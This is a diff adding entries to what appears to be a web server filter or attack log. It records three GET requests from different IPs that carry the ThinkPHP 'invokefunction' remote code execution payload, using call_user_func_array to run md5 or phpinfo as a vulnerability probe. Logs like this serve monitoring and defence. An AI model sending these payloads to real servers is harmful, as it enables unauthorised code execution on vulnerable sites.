@@ -1,0 +1,9 @@
+data_filter|20200508131439|5.101.0.209|155.138.161.28:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP||
+|GET
+{"s":"\/Index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["md5",["HelloThinkPHP"]]}
+data_filter|20200508132123|195.54.160.121|155.138.161.28:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP||
+|GET
+{"s":"\/Index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["md5",["HelloThinkPHP"]]}
+data_filter|20200508211703|154.113.16.226|155.138.161.28/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1||
+|GET
+{"s":"index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["phpinfo",["1"]]}
